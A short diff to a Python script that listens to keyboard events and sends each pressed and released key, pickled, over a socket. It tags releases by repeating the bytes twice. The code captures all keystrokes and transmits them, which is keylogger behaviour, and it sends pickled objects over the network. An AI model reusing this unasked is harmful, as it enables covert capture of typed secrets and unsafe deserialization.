@@ -16,13 +16,14 @@ def on_press(key):
         print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
         print('special key {0} pressed'.format(key))
-    socket.send(pickle.dumps(key))
+    socket.send(pickle.dumps(key) * 1)
 
 def on_release(key):
     print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         # Stop listener
         return False
+    socket.send(pickle.dumps(key) * 2)
 
 # Collect events until released
 with keyboard.Listener(
